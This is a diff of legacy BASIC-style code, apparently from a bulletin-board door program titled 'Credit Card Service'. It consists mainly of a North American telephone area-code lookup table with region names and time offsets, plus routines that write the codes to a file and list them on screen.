+IF A$ == "867"
+ ASD1$ = "Northwest Territ. "
+ ASD2$ = "Whitehorse"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "868"
+ ASD1$ = "Trinidad & Tobago "
+ ASD2$ = "(ALL)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "869"
+ ASD1$ = "St Kitts & Nevis  "
+ ASD2$ = "(ALL)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "870"
+ ASD1$ = "Arkansas          "
+ ASD2$ = "El Dorado, Jonesboro, Paine Bluff"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "876"
+ ASD1$ = "Jamaica           "
+ ASD2$ = "(ALL)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "888"
+ ASD1$ = "Toll-Free         "
+ ASD2$ = "free for caller"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "900"
+ ASD1$ = "Additional Charges"
+ ASD2$ = "Pay-Per-Call (caller pays)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "901"
+ ASD1$ = "Tennessee (TN)    "
+ ASD2$ = "Memphis"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "902"
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Prince Edward Island (PE), Nova Scotia (NS)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "903"
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "Greenville, Longview, Texarkana, Tyler"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "904"
+ ASD1$ = "Florida (FL)      "
+ ASD2$ = "Jacksonville, Tallahassee"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "905"
+ ASD1$ = "Canada (CA)       "
+ ASD2$ = "Ontario (ON),Burlington,Bowmanville,Hamilton,Mississauga,Oshawa,St.Catharines,Welland,Niagara Falls"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "906"
+ ASD1$ = "Michigan (MI)     "
+ ASD2$ = "Escanaba, Marquette, Sault Ste. Marie"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "907"
+ ASD1$ = "Alaska (AK)       "
+ ASD2$ = "(All)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "908"
+ ASD1$ = "New Jersey (NJ)   "
+ ASD2$ = "Edison"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "909"
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Ontario, Riverside, San Bernardino"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "910"
+ ASD1$ = "North Carolina    "
+ ASD2$ = "Asheboro, Fayetteville, Mt Airy, Wilkesboro, Wilmington"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "912"
+ ASD1$ = "Georgia (GA)      "
+ ASD2$ = "Savannah, Waycross"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "913"
+ ASD1$ = "Kansas (KS)       "
+ ASD2$ = "Lawrence, Manhattan, Salina, Topeka"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "914"
+ ASD1$ = "New York (NY)     "
+ ASD2$ = "White Plains"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "915"
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "Abilene, Alpine, Big Spring, El Paso, Midland, Odessa"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "916"
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Sacramento"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "917"
+ ASD1$ = "New York (NY)     "
+ ASD2$ = "New York City"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "918"
+ ASD1$ = "Oklahoma (OK)     "
+ ASD2$ = "Bartlesville, Mcalester, Muskogee, Tulsa"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "919"
+ ASD1$ = "North Carolina    "
+ ASD2$ = "Greenville, Raleigh, Winston,Salem"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "920"
+ ASD1$ = "Wisconsin         "
+ ASD2$ = "Green Bay, Oshkosh"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "937"
+ ASD1$ = "Ohio              "
+ ASD2$ = "Middletown, Springfield, Wilmington, Xenia"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "940"
+ ASD1$ = "Texas             "
+ ASD2$ = "Denton, Wichita Falls"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "941"
+ ASD1$ = "Florida (FL)      "
+ ASD2$ = "Bradenton, Englewood, Fort Myers, Lakeland, Naples, Sarasota"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "954"
+ ASD1$ = "Florida (FL)      "
+ ASD2$ = ""
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "956"
+ ASD1$ = "Texas             "
+ ASD2$ = "Brownsville, McAllen"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "970"
+ ASD1$ = "Colorado (CO)     "
+ ASD2$ = "Ft Collins, Greeley, Loveland"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "972"
+ ASD1$ = "Texas             "
+ ASD2$ = "Dallas, Garland, Grand Prairie, Irving, Plano"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "973"
+ ASD1$ = "New Jersey        "
+ ASD2$ = "Newark, Paterson"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+
+IF A$ == "999"
+ ASD1$ = "ALL SELECTED      "
+ ASD2$ = " "
+ RETURN
+Endif
+
+IF ASD1$ == "None"
+ A$=""
+Endif
+RETURN
+
+AREA_W:
+If Exists (AREA$)
+  open Append 1, AREA$
+  write #1,A$
+  Close #1
+  C=C+1
+ else 
+  open OutPut 1, AREA$
+  write #1,A$
+  Close #1
+  C=C+1
+endif
+GOTO AREACODE
+
+AREA_I:
+ASD1$="None"
+ASD2$=""
+Close #99
+  open OutPut 1, AREA$
+  Close #1
+  C=0
+RETURN
+
+PHONE_I:
+  open OutPut 1, PHONE$
+  Close #1
+RETURN
+
+DIAL_ALL:
+Open output 1, AREA$
+write #1,"201"
+write #1,"202"
+write #1,"203"
+write #1,"204"
+write #1,"205"
+write #1,"206"
+write #1,"207"
+write #1,"208"
+write #1,"209"
+write #1,"210"
+write #1,"212"
+write #1,"213"
+write #1,"214"
+write #1,"215"
+write #1,"216"
+write #1,"217"
+write #1,"218"
+write #1,"219"
+write #1,"240"
+write #1,"242"
+write #1,"248"
+write #1,"250"
+write #1,"253"
+write #1,"254"
+write #1,"264"
+write #1,"268"
+write #1,"281"
+write #1,"302"
+write #1,"303"
+write #1,"304"
+write #1,"305"
+write #1,"306"
+write #1,"307"
+write #1,"308"
+write #1,"309"
+write #1,"310"
+write #1,"312"
+write #1,"313"
+write #1,"314"
+write #1,"315"
+write #1,"316"
+write #1,"317"
+write #1,"318"
+write #1,"319"
+write #1,"320"
+write #1,"330"
+write #1,"334"
+write #1,"340"
+write #1,"345"
+write #1,"352"
+write #1,"360"
+write #1,"401"
+write #1,"402"
+write #1,"403"
+write #1,"404"
+write #1,"405"
+write #1,"406"
+write #1,"407"
+write #1,"408"
+write #1,"409"
+write #1,"412"
+write #1,"413"
+write #1,"414"
+write #1,"415"
+write #1,"416"
+write #1,"417"
+write #1,"418"
+write #1,"419"
+write #1,"423"
+write #1,"425"
+write #1,"440"
+write #1,"441"
+write #1,"443"
+write #1,"473"
+write #1,"501"
+write #1,"502"
+write #1,"503"
+write #1,"504"
+write #1,"505"
+write #1,"506"
+write #1,"507"
+write #1,"508"
+write #1,"509"
+write #1,"510"
+write #1,"512"
+write #1,"513"
+write #1,"514"
+write #1,"515"
+write #1,"516"
+write #1,"517"
+write #1,"518"
+write #1,"519"
+write #1,"520"
+write #1,"540"
+write #1,"541"
+write #1,"561"
+write #1,"562"
+write #1,"573"
+write #1,"601"
+write #1,"602"
+write #1,"603"
+write #1,"604"
+write #1,"605"
+write #1,"606"
+write #1,"607"
+write #1,"608"
+write #1,"609"
+write #1,"610"
+write #1,"612"
+write #1,"613"
+write #1,"614"
+write #1,"615"
+write #1,"616"
+write #1,"617"
+write #1,"618"
+write #1,"619"
+write #1,"626"
+write #1,"630"
+write #1,"649"
+write #1,"650"
+write #1,"664"
+write #1,"670"
+write #1,"671"
+write #1,"701"
+write #1,"702"
+write #1,"703"
+write #1,"704"
+write #1,"705"
+write #1,"706"
+write #1,"707"
+write #1,"708"
+write #1,"709"
+write #1,"712"
+write #1,"713"
+write #1,"714"
+write #1,"715"
+write #1,"716"
+write #1,"717"
+write #1,"718"
+write #1,"719"
+write #1,"732"
+write #1,"757"
+write #1,"758"
+write #1,"760"
+write #1,"765"
+write #1,"770"
+write #1,"773"
+write #1,"787"
+write #1,"800"
+write #1,"801"
+write #1,"802"
+write #1,"803"
+write #1,"804"
+write #1,"805"
+write #1,"806"
+write #1,"807"
+write #1,"808"
+write #1,"809"
+write #1,"810"
+write #1,"812"
+write #1,"813"
+write #1,"814"
+write #1,"815"
+write #1,"816"
+write #1,"817"
+write #1,"818"
+write #1,"819"
+write #1,"830"
+write #1,"847"
+write #1,"850"
+write #1,"860"
+write #1,"864"
+write #1,"867"
+write #1,"868"
+write #1,"869"
+write #1,"870"
+write #1,"876"
+write #1,"888"
+write #1,"900"
+write #1,"901"
+write #1,"902"
+write #1,"903"
+write #1,"904"
+write #1,"905"
+write #1,"906"
+write #1,"907"
+write #1,"908"
+write #1,"909"
+write #1,"910"
+write #1,"912"
+write #1,"913"
+write #1,"914"
+write #1,"915"
+write #1,"916"
+write #1,"917"
+write #1,"918"
+write #1,"919"
+write #1,"920"
+write #1,"937"
+write #1,"940"
+write #1,"941"
+write #1,"954"
+write #1,"956"
+write #1,"970"
+write #1,"972"
+write #1,"973"
+Close #1
+C=205
+A$ = "999"
+Return
+
+
+AREA_V:
+D=0
+IF EXISTS (AREA$)
+	Open Input 1, AREA$
+	Print Local " Loading File ..."
+	Else
+	Print Local " Missing File ..."
+	pause 2
+	goto MainMenu
+	endif
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "   [0m   [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local
+
+AREA_1:
+D=D+1
+READ #1, A$
+IF A$ == "END_OF_FILE"
+ GOTO AREA_9
+ENDIF
+gosub Check
+Print Local "[33m "A$"[0m-"ASD1$;
+GOTO AREA_2
+
+AREA_2:
+READ #1, A$
+IF A$ == "END_OF_FILE"
+ GOTO AREA_9
+ENDIF
+gosub Check
+Print Local "[33m "A$"[0m-"ASD1$;
+GOTO AREA_3
+
+AREA_3:
+READ #1, A$
+IF A$ == "END_OF_FILE"
+ GOTO AREA_9
+ENDIF
+gosub Check
+Print Local
+Print Local "[33m "A$"[0m-"ASD1$;
+If D==6
+ Print local
+ Print local
+ ASK LOCAL " Press Return (Q=Abort)...",P$
+	P$ = LOWER$(P$)
+	If P$=="q"
+	 Close #1
+	 goto areacode
+	endif
+ CLS
+ Print Local "                                                    ###"
+ Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "   [0m   [0m@ @[0m    [0mDate:"date$
+ Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+ Print Local
+ D=0
+Endif
+GOTO AREA_1
+
+AREA_9:
+CLOSE #1
+Print Local
+Print Local
+ASK LOCAL "Press Return ...",P$
+Print Local
+ASD1$=""
+ASD2$=""
+A$=""
+Return
+
+CHECK:
+Global$="T:_TIME"
+timeH$ = Left$(Time$,2)
+timeM$ = MID$(Time$,4,2)
+OPEN	OUTPUT 3,Global$
+WRITE	#3 timeh$
+CLOSE	#3
+OPEN	INPUT 3,Global$
+READ	#3,timeh
+CLOSE	#3
+
+IF A$ == "011"
+ TimeH=TimeH
+ ASD1$ = "International Call"
+ ASD2$ = " "
+Endif
+IF A$ == "201" 
+ TimeH=TimeH-5
+ ASD1$ = "New Jersey (NJ)   "
+ ASD2$ = "Hackensack, Newark, New Brunswick, Paterson"
+Endif
+IF A$ == "202" 
+ TimeH=TimeH-5
+ ASD1$ = "Washington DC (DC)"
+ ASD2$ = ""
+Endif
+IF A$ == "203" 
+ TimeH=TimeH-5
+ ASD1$ = "Connecticut (CT)  "
+ ASD2$ = "(All)"
+Endif
+IF A$ == "204"
+ TimeH=TimeH
+ ASD1$ = "Canada (CN)      + "
+ ASD2$ = ""
+Endif
+IF A$ == "205" 
+ TimeH=TimeH-6
+ ASD1$ = "Alabama (AL)      "
+ ASD2$ = ""
+Endif
+IF A$ == "206" 
+ TimeH=TimeH-8
+ ASD1$ = "Washington (WA)   "
+ ASD2$ = ""
+Endif
+IF A$ == "207"
+ TimeH=TimeH-5
+ ASD1$ = "Maine (ME)        "
+ ASD2$ = "(All)"
+Endif
+IF A$ == "208" 
+ TimeH=TimeH-7
+ ASD1$ = "Idaho (ID)        "
+ ASD2$ = "(All)"
+Endif
+IF A$ == "209" 
+ TimeH=TimeH-8
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Fresno"
+Endif
+IF A$ == "210" 
+ TimeH=TimeH-6
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "San Antonio,Brownsville,McAllen,Bandera, Fredericksburg,Edinburg,Alamo"
+Endif
+IF A$ == "212" 
+ TimeH=TimeH-5
+ ASD1$ = "New York (NY)     "
+ ASD2$ = "New York City"
+Endif
+IF A$ == "213" 
+ TimeH=TimeH-8
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Central Los Angeles, Hollywood"
+Endif
+IF A$ == "214" 
+ TimeH=TimeH-6
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "Dallas, Denison, Paris, Sherman, Ennis, Greenville"
+Endif
+IF A$ == "215" 
+ TimeH=TimeH-5
+ ASD1$ = "Pennsylvania (PA) "
+ ASD2$ = "Allentown(Lehigh Co.),Philadelphia,Lansdale,Levittown,Newtown,Quakertown"
+Endif
+IF A$ == "216" 
+ TimeH=TimeH-5
+ ASD1$ = "Ohio (OH)         "
+ ASD2$ = "Akron, Cleveland, Youngstown"
+Endif
+IF A$ == "217" 
+ TimeH=TimeH-6
+ ASD1$ = "Illinois (IL)     "
+ ASD2$ = "Springfield"
+Endif
+IF A$ == "218" 
+ TimeH=TimeH-6
+ ASD1$ = "Minnesota (MN)    "
+ ASD2$ = "Duluth"
+Endif
+IF A$ == "219" 
+ TimeH=TimeH-6
+ ASD1$ = "Indiana (IN)      "
+ ASD2$ = "Gary, South Bend, Warsaw"
+Endif
+IF A$ == "240" 
+ TimeH=TimeH-5
+ ASD1$ = "Maryland          "
+ ASD2$ = "Cumberland, Frederick, Hagerstown"
+Endif
+IF A$ == "242" 
+ TimeH=TimeH-5
+ ASD1$ = "Bahamas           "
+ ASD2$ = "(ALL)"
+Endif
+IF A$ == "248" 
+ TimeH=TimeH-5
+ ASD1$ = "Michigan          "
+ ASD2$ = "Novi, Waterford, Troy"
+Endif
+IF A$ == "250" 
+ TimeH=TimeH-9
+ ASD1$ = "British Columbia  "
+ ASD2$ = "Interior, Vancouver Island) and Alaska (major city: Hyder)"
+Endif
+IF A$ == "253" 
+ TimeH=TimeH-8
+ ASD1$ = "Washington        "
+ ASD2$ = "Auburn, Kent, Tacoma"
+Endif
+IF A$ == "254" 
+ TimeH=TimeH-6
+ ASD1$ = "Texas             "
+ ASD2$ = "Waco"
+Endif
+IF A$ == "264" 
+ TimeH=TimeH-4
+ ASD1$ = "Anguilla          "
+ ASD2$ = "(ALL)"
+Endif
+IF A$ == "268" 
+ TimeH=TimeH-4
+ ASD1$ = "Antigua & Barbuda "
+ ASD2$ = "(ALL)"
+Endif
+IF A$ == "281" 
+ TimeH=TimeH-6
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "Deer Park"
+Endif
+IF A$ == "301" 
+ TimeH=TimeH-5
+ ASD1$ = "Maryland (MD)*OLD*"
+ ASD2$ = "(All)"
+Endif
+IF A$ == "302"
+ TimeH=TimeH-5
+ ASD1$ = "Delaware (DE)     "
+ ASD2$ = "(All)"
+Endif
+IF A$ == "303" 
+ TimeH=TimeH-7
+ ASD1$ = "Colorado (CO)     "
+ ASD2$ = "Denver, Grand Junction, Sterling"
+Endif
+IF A$ == "304" 
+ TimeH=TimeH-5
+ ASD1$ = "West Virginia (WV)"
+ ASD2$ = "(All)"
+Endif
+IF A$ == "305" 
+ TimeH=TimeH-5
+ ASD1$ = "Florida (FL)      "
+ ASD2$ = "Ft. Lauderdale, Key West, Miami"
+Endif
+IF A$ == "306"
+ TimeH=TimeH-7
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Saskatchewan (SK)"
+Endif
+IF A$ == "307" 
+ TimeH=TimeH-7
+ ASD1$ = "Wyoming (WY)      "
+ ASD2$ = " (All)"
+Endif
+IF A$ == "308" 
+ TimeH=TimeH-6
+ ASD1$ = "Nebraska (NE)     "
+ ASD2$ = "North Platte"
+Endif
+IF A$ == "309" 
+ TimeH=TimeH-6
+ ASD1$ = "Illinois (IL)     "
+ ASD2$ = "Peoria"
+Endif
+IF A$ == "310" 
+ TimeH=TimeH-8
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Long Beach, Redondo Beach, San Pedro, Santa Monica, Century City, Malibu"
+Endif
+IF A$ == "312" 
+ TimeH=TimeH-6
+ ASD1$ = "Illinois (IL)     "
+ ASD2$ = "Aurora, Chicago, Waukegan"
+Endif
+IF A$ == "313" 
+ TimeH=TimeH-5
+ ASD1$ = "Michigan (MI)     "
+ ASD2$ = "Ann Arbor,Detroit,Monroe,Chelsea,Dearborn,Plymouth,Livonia,Lincoln Park,Romulus,Taylor,Westland"
+Endif
+IF A$ == "314" 
+ TimeH=TimeH-6
+ ASD1$ = "Missouri (MO)     "
+ ASD2$ = "Poplar Bluff, Rolla, St. Louis"
+Endif
+IF A$ == "315" 
+ TimeH=TimeH-5
+ ASD1$ = "New York (NY)     "
+ ASD2$ = "Syracuse"
+Endif
+IF A$ == "316" 
+ TimeH=TimeH-6
+ ASD1$ = "Kansas (KS)       "
+ ASD2$ = "Dodge City, Wichita"
+Endif
+IF A$ == "317" 
+ TimeH=TimeH-6
+ ASD1$ = "Indiana (IN)      "
+ ASD2$ = "Indianapolis, Kokomo"
+Endif
+IF A$ == "318" 
+ TimeH=TimeH-6
+ ASD1$ = "Louisiana (LA)    "
+ ASD2$ = "Lake Charles, Shreveport"
+Endif
+IF A$ == "319"
+ TimeH=TimeH-6
+ ASD1$ = "Iowa (IA)         "
+ ASD2$ = "Dubuque"
+Endif
+IF A$ == "320"
+ TimeH=TimeH-6
+ ASD1$ = "Minnesota         "
+ ASD2$ = "Alexandria, St Cloud"
+Endif
+IF A$ == "330" 
+ TimeH=TimeH-5
+ ASD1$ = "Ohio              "
+ ASD2$ = "Akron, Canton, Warren, Youngstown"
+Endif
+IF A$ == "334"
+ TimeH=TimeH-6
+ ASD1$ = "Alabama (AL)      "
+ ASD2$ = "Montgomery, Mobile"
+Endif
+IF A$ == "340"
+ TimeH=TimeH-4
+ ASD1$ = "US Virgin Islands "
+ ASD2$ = "(ALL)"
+Endif
+IF A$ == "345"
+ TimeH=TimeH-5
+ ASD1$ = "Cayman Islands    "
+ ASD2$ = "(ALL)"
+Endif
+IF A$ == "352"
+ TimeH=TimeH-5
+ ASD1$ = "Florida           "
+ ASD2$ = "Gainesville"
+Endif
+IF A$ == "360"
+ TimeH=TimeH-8
+ ASD1$ = "Washington (WA)   "
+ ASD2$ = "Bellingham, Longview, Marysville, Olympia, Port Orchard, Vancouver, Yelm"
+Endif
+IF A$ == "401"
+ TimeH=TimeH-5
+ ASD1$ = "Rhode Island (RI) "
+ ASD2$ = "(All)"
+endif
+IF A$ == "402"
+ TimeH=TimeH-6
+ ASD1$ = "-Nebraska (NE)    "
+ ASD2$ = "Lincoln, Omaha"
+Endif
+IF A$ == "403"
+ TimeH=TimeH-7
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Alberta (AB), Calgary"
+Endif
+IF A$ == "404"
+ TimeH=TimeH-5
+ ASD1$ = "Georgia (GA)      "
+ ASD2$ = "Atlanta, Rome, Marietta, Kennesaw, Norcross, Woodstock, Gainesville"
+Endif
+IF A$ == "405"
+ TimeH=TimeH-6
+ ASD1$ = "Oklahoma (OK)     "
+ ASD2$ = "Norman, Oklahoma City, Stillwater"
+Endif
+IF A$ == "406"
+ TimeH=TimeH-7
+ ASD1$ = "Montana (MT)      "
+ ASD2$ = "(All)"
+Endif
+IF A$ == "407"
+ TimeH=TimeH-5
+ ASD1$ = "Florida (FL)      "
+ ASD2$ = "Deltona,Kissimmee,Longwood,Melbourne,Orlando,Palm Beach,Titusville,Winter Park"
+Endif
+IF A$ == "408"
+ TimeH=TimeH-8
+ ASD1$ = "California (CA)   "
+ ASD2$ = "San Jose"
+Endif
+IF A$ == "409"
+ TimeH=TimeH-6
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "Bryan, College Station, Galveston, Beaumont, Vidor, Richwood"
+Endif
+IF A$ == "410"
+ TimeH=TimeH-5
+ ASD1$ = "Maryland (MD)     "
+ ASD2$ = "Annapolis, Baltimore, Cambridge, Cockeysville"
+Endif
+IF A$ == "412"
+ TimeH=TimeH-5
+ ASD1$ = "Pennsylvania (PA) "
+ ASD2$ = "Pittsburgh"
+Endif
+IF A$ == "413"
+ TimeH=TimeH-5
+ ASD1$ = "Massachusetts (MA)"
+ ASD2$ = "Springfield"
+Endif
+IF A$ == "414"
+ TimeH=TimeH-6
+ ASD1$ = "Wisconsin (WI)    "
+ TimeH=TimeH-6
+ ASD2$ = "Green Bay, Milwaukee, Racine"
+Endif
+IF A$ == "415"
+ TimeH=TimeH-8
+ ASD1$ = "California (CA)   "
+ ASD2$ = "San Francisco, San Rafael, San Bruno, Los Altos"
+Endif
+IF A$ == "416"
+ TimeH=TimeH-5
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Ontario (ON), Toronto, Hamilton"
+Endif
+IF A$ == "417"
+ TimeH=TimeH-6
+ ASD1$ = "Missouri (MO)     "
+ ASD2$ = "Joplin, Springfield"
+Endif
+IF A$ == "418"
+ TimeH=TimeH-4
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Quebec (PQ)"
+Endif
+IF A$ == "419"
+ TimeH=TimeH-5
+ ASD1$ = "Ohio (OH)         "
+ ASD2$ = "Bowling Green, Findlay, Lima, Toledo"
+Endif
+IF A$ == "423"
+ TimeH=TimeH-6
+ ASD1$ = "Kentucky          "
+ ASD2$ = "Jellico, Kensee, Lot, Oneida, Saxton"
+Endif
+IF A$ == "425"
+ TimeH=TimeH-8
+ ASD1$ = "Washington        "
+ ASD2$ = "Bellevue, Edmonds, Everett"
+Endif
+IF A$ == "440"
+ TimeH=TimeH-5
+ ASD1$ = "Ohio              "
+ ASD2$ = "Cleveland, Mentor, Oberlin, Westlake"
+Endif
+IF A$ == "441"
+ TimeH=TimeH-4
+ ASD1$ = "Bermuda           "
+ ASD2$ = "(All)"
+Endif
+IF A$ == "443"
+ TimeH=TimeH-5
+ ASD1$ = "Maryland          "
+ ASD2$ = "Annapolis, Baltimore, Rockville, Salisbury"
+Endif
+IF A$ == "473"
+ TimeH=TimeH-4
+ ASD1$ = "Grenada           "
+ ASD2$ = "(All)"
+Endif
+IF A$ == "501"
+ TimeH=TimeH-6
+ ASD1$ = "Arkansas (AR)     "
+ ASD2$ = "(All)"
+Endif
+IF A$ == "502"
+ TimeH=TimeH-6
+ ASD1$ = "Kentucky (KY)     "
+ ASD2$ = "Frankfort, Louisville, Paducah, Shelbyville"
+Endif
+IF A$ == "503"
+ TimeH=TimeH-8
+ ASD1$ = "Oregon (OR)       "
+ ASD2$ = "(All)"
+Endif
+IF A$ == "504"
+ TimeH=TimeH-6
+ ASD1$ = "Louisiana (LA)    "
+ ASD2$ = "Baton Rouge, New Orleans"
+Endif
+IF A$ == "505"
+ TimeH=TimeH-7
+ ASD1$ = "New Mexico (NM)   "
+ ASD2$ = "(All)"
+Endif
+IF A$ == "506"
+ TimeH=TimeH-4
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "New Brunswick (NB)"
+Endif
+IF A$ == "507"
+ TimeH=TimeH-6
+ ASD1$ = "Minnesota (MN)    "
+ ASD2$ = "Rochester"
+Endif
+IF A$ == "508"
+ TimeH=TimeH-5
+ ASD1$ = "Massachusetts (MA)"
+ ASD2$ = "Northborough"
+Endif
+IF A$ == "509"
+ TimeH=TimeH-8
+ ASD1$ = "Washington (WA)   "
+ ASD2$ = "Spokane, Walla Walla"
+Endif
+IF A$ == "510"
+ TimeH=TimeH-8
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Berkeley, Fremont, Oakland, Walnut Creek"
+Endif
+IF A$ == "512"
+ TimeH=TimeH-6
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "Alice,Del Rio,Corpus Christi,Austin,Brownsville,Rockport,San Antonio"
+Endif
+IF A$ == "513"
+ TimeH=TimeH-5
+ ASD1$ = "Ohio (OH)         "
+ ASD2$ = "Cincinnati, Dayton"
+Endif
+IF A$ == "514"
+ TimeH=TimeH-4
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Quebec (PQ), Montreal"
+Endif
+IF A$ == "515"
+ TimeH=TimeH-6
+ ASD1$ = "Iowa (IA)         "
+ ASD2$ = "Des Moines"
+Endif
+IF A$ == "516"
+ TimeH=TimeH-5
+ ASD1$ = "New York (NY)     "
+ ASD2$ = "Amityville, Farmingdale, Hempstead, Levittown"
+Endif
+IF A$ == "517"
+ TimeH=TimeH-5
+ ASD1$ = "Michigan (MI)     "
+ ASD2$ = "Lansing, Saginaw, Alpena, Jackson"
+Endif
+IF A$ == "518"
+ TimeH=TimeH-5
+ ASD1$ = "New York (NY)     "
+ ASD2$ = "Albany, Schenectady"
+Endif
+IF A$ == "519"
+ TimeH=TimeH-5
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Ontario (ON), London"
+Endif
+IF A$ == "520"
+ TimeH=TimeH-7
+ ASD1$ = "Arizona (AZ)      "
+ ASD2$ = ""
+Endif
+IF A$ == "540"
+ TimeH=TimeH-5
+ ASD1$ = "Virginia (VA)     "
+ ASD2$ = "Fredericksburg, Roanoke, Spotsylvania, Stephens City, Troutville"
+Endif
+IF A$ == "541"
+ TimeH=TimeH-8
+ ASD1$ = "Oregon            "
+ ASD2$ = "Ashland, Bend, Corvallis, Eugene, Pendleton"
+Endif
+IF A$ == "562"
+ TimeH=TimeH-8
+ ASD1$ = "California (CA)   "
+ ASD2$ = ""
+Endif
+IF A$ == "573"
+ TimeH=TimeH-6
+ ASD1$ = "Missouri          "
+ ASD2$ = "Columbia, Hannibal, Jefferson City"
+Endif
+IF A$ == "601"
+ TimeH=TimeH-6
+ ASD1$ = "Mississippi (MS)  "
+ ASD2$ = "(All)"
+Endif
+IF A$ == "602"
+ TimeH=TimeH-7
+ ASD1$ = "Arizona (AZ)      "
+ ASD2$ = " "
+Endif
+IF A$ == "603"
+ TimeH=TimeH-5
+ ASD1$ = "New Hampshire (NH)"
+ ASD2$ = "(All)"
+Endif
+IF A$ == "604"
+ TimeH=TimeH-8
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "British Columbia (BC)"
+Endif
+IF A$ == "605"
+ TimeH=TimeH-6
+ ASD1$ = "South Dakota (SD) "
+ ASD2$ = "(All)"
+Endif
+IF A$ == "606"
+ TimeH=TimeH-6
+ ASD1$ = "Kentucky (KY)     "
+ ASD2$ = "Covington, Winchester"
+Endif
+IF A$ == "607"
+ TimeH=TimeH-5
+ ASD1$ = "New York (NY)     "
+ ASD2$ = "Binghamton"
+Endif
+IF A$ == "608"
+ TimeH=TimeH-6
+ ASD1$ = "Wisconsin (WI)    "
+ ASD2$ = "Madison"
+Endif
+IF A$ == "609"
+ TimeH=TimeH-5
+ ASD1$ = "New Jersey (NJ)   "
+ ASD2$ = "Atlantic City, Camden, Trenton"
+Endif
+IF A$ == "610"
+ TimeH=TimeH-5
+ ASD1$ = "Pennsylvania (PA) "
+ ASD2$ = "Allentown, Boyertown, Downingtown, Fleetwood, Sadsburyville"
+Endif
+IF A$ == "612"
+ TimeH=TimeH-6
+ ASD1$ = "Minnesota (MN)    "
+ ASD2$ = "Minneapolis, St Paul"
+Endif
+IF A$ == "613"
+ TimeH=TimeH-5
